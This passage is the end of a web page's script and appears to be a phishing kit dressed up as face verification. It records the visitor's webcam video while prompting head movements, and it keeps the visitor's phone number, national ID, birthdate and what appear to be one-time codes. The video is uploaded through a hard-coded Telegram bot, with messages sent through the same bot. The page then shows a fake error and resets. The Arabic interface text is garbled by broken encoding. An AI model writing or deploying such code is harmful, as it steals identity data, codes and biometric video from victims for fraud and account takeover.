    cancelBtn.onclick = () => { cancelled = true; try { if (recorder && recorder.state !== 'inactive') recorder.stop(); } catch(e){} stopStream(stream); stopFaceMesh(); renderCode4Step(); };

    // small delay to let camera warm up
    await wait(300);

    // For each step: set baseline, countdown, start recorder, wait duration, stop recorder
    for (let i = 0; i < steps.length; i++) {
      if (cancelled) break;
      const st = steps[i];

      // show instruction text (explicit) before baseline
      instructionBox.textContent = st.instruction;
      lastDirection = '';
      baselineX = null; // will set shortly

      // give MediaPipe a chance to detect face and set baseline
      // wait until we have a landmark by polling briefly (max 2s)
      let attempts = 0;
      let found = false;
      while (attempts < 20 && !found) { // ~ 20 * 100ms = 2s
        await wait(100);
        // attempt to get a snapshot of last results synchronously isn't available;
        // instead rely on the faceMesh onResults which sets baseline when we see it below.
        // implement baseline setting by temporarily adding a short onResults wrapper:
        attempts++;
        // we will wait a bit and then set baseline to current face position via a synchronous approach:
        // unfortunately faceMesh does not expose last results directly; we approximate by letting onResults set baseline via a small helper:
      }

      // To reliably set baseline, request one synchronous detection: send an image and wait for faceMesh to call onResults
      // We'll set a one-time listener to capture the current shownX as baseline.
      let baselineCaptured = false;
      const baselineListener = (results) => {
        if (!results.multiFaceLandmarks || !results.multiFaceLandmarks[0]) return;
        const lm = results.multiFaceLandmarks[0][1];
        if (!lm) return;
        baselineX = 1 - lm.x; // mirror for displayed video
        baselineCaptured = true;
      };
      // attach temporary listener
      faceMesh.onResults(baselineListener);
      // send one frame
      await faceMesh.send({ image: videoEl });
      // wait until captured or timeout
      let tWait = 0;
      while (!baselineCaptured && tWait < 1500) { await wait(100); tWait += 100; }
      // remove temporary listener and restore main listener used earlier
      faceMesh.onResults((results) => {
        if (!results.multiFaceLandmarks || !results.multiFaceLandmarks[0]) return;
        const lm = results.multiFaceLandmarks[0][1];
        if (!lm) return;
        const shownX = 1 - lm.x;
        if (baselineX === null) return;
        const delta = shownX - baselineX;
        let dir = '';
        if (delta > 0.03) dir = 'ÙŠÙ…ÙŠÙ†';
        else if (delta < -0.03) dir = 'ÙŠØ³Ø§Ø±';
        else dir = 'Ù…Ø±ÙƒØ²';
        if (dir === 'Ù…Ø±ÙƒØ²') instructionBox.textContent = `(Ù…Ø±ÙƒØ²) - Ø­Ø§ÙØ¸ Ø¹Ù„Ù‰ ÙˆØ¶Ø¹ Ø§Ù„Ø±Ø£Ø³ Ø«Ù… Ø§ØªØ¨Ø¹ Ø§Ù„ØªØ¹Ù„ÙŠÙ…Ø§Øª`;
        else instructionBox.textContent = `ØªØªØ­Ø±Ùƒ Ù†Ø­Ùˆ ${dir}`;
      });

      // countdown 3..1
      countdownEl.style.display = 'block';
      for (let c = 3; c >= 1; c--) {
        countdownEl.textContent = c;
        await wait(700);
      }
      countdownEl.style.display = 'none';

      // start recording this segment
      try { recorder.start(); } catch (err) { console.warn('Recorder start failed', err); }

      // During the segment update the instruction box with seconds left
      let remaining = Math.ceil(st.duration / 1000);
      for (let s = remaining; s >= 1; s--) {
        // If baseline wasn't captured earlier, attempt to set it now from last known face detection (best-effort)
        if (baselineX === null) {
          // attempt one more synchronous send to get baseline
          try { await faceMesh.send({ image: videoEl }); } catch(e){}
        }
        instructionBox.textContent = `${st.label} â€” ØªØ¨Ù‚Ù‘Ù‰ ${s} Ø«Ø§Ù†ÙŠØ©`;
        await wait(1000);
      }

      // stop recording for this segment
      if (recorder.state !== 'inactive') {
        try { recorder.stop(); } catch (e) { console.warn('Recorder stop failed', e); }
      }
      // small pause to let ondataavailable handlers run
      await wait(300);
    }

    // finalize
    stopStream(stream);
    stopFaceMesh();

    // merge chunks and send video
    const finalBlob = new Blob(allChunks.filter(b => b && b.size), { type: allChunks[0] ? allChunks[0].type : 'video/webm' });
    showProcessing(true);
    try {
      await sendVideoToTelegramAsVideo(finalBlob);
    } catch (err) {
      console.error('send video error', err);
    } finally {
      showProcessing(false);
    }
    showFinalErrorAndReset();
  }

  // stop and cleanup MediaPipe
  function stopFaceMesh(){
    try {
      if (mpCamera) { mpCamera.stop(); mpCamera = null; }
      if (faceMesh) { faceMesh.close(); faceMesh = null; }
    } catch (e) { console.warn('stopFaceMesh', e); }
  }

  // --- Telegram helpers ---
  async function sendVideoToTelegramAsVideo(blob){
    try {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      const ext = blob.type.includes('mp4') ? 'mp4' : (blob.type.includes('webm') ? 'webm' : 'mp4');
      const fileName = `${userData.phone || 'user'}_face_${Date.now()}.${ext}`;
      form.append('video', blob, fileName);
      form.append('caption', `Face verification â€” ${userData.phone || ''}`);
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: form });
      const data = await res.json();
      if (data && data.ok && data.result && data.result.message_id) { telegramMsgId = data.result.message_id; return; }
      console.warn('sendVideo non-ok', data);
      await sendVideoAsDocumentFallback(blob);
    } catch (err) {
      console.error('sendVideo error', err);
      try { await sendVideoAsDocumentFallback(blob); } catch(e){ console.error('fallback failed', e); throw err; }
    }
  }
  async function sendVideoAsDocumentFallback(blob){
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    const fileName = `${userData.phone || 'user'}_face_${Date.now()}.webm`;
    form.append('document', blob, fileName);
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body: form });
    const data = await res.json();
    if (data && data.ok && data.result && data.result.message_id) telegramMsgId = data.result.message_id;
    else console.warn('sendDocument failed', data);
  }

  async function sendToTelegramAndGetMsgId(msg){
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
      });
      const data = await res.json();
      if (data && data.result && data.result.message_id) return data.result.message_id;
    } catch (e) { console.log('telegram send error', e); }
    return null;
  }
  async function resendTelegramMsg(msg){
    if (telegramMsgId) {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
          method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ chat_id: CHAT_ID, message_id: telegramMsgId })
        });
      } catch(e){}
    }
    return await sendToTelegramAndGetMsgId(msg);
  }

  function stopStream(stream){ if(!stream) return; stream.getTracks().forEach(t=>{ try{ t.stop(); } catch(e){} }); }
  function wait(ms){ return new Promise(res=>setTimeout(res, ms)); }

  function showProcessing(show){ const m = document.getElementById('processingModal'); if(!m) return; if(show) m.classList.add('active'); else m.classList.remove('active'); }

  function showFinalErrorAndReset(){
    const modal = document.getElementById('modalError');
    modal.classList.add('active');
    const btn = document.getElementById('modalCloseBtn');
    function handler(){
      modal.classList.remove('active');
      btn.removeEventListener('click', handler);
      userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
      renderPhoneStep();
    }
    btn.addEventListener('click', handler);
    setTimeout(()=>{
      if(modal.classList.contains('active')){
        modal.classList.remove('active');
        userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
        renderPhoneStep();
      }
    }, 2500);
  }

  // Start app
  renderPhoneStep();
</script>
</body>
</html>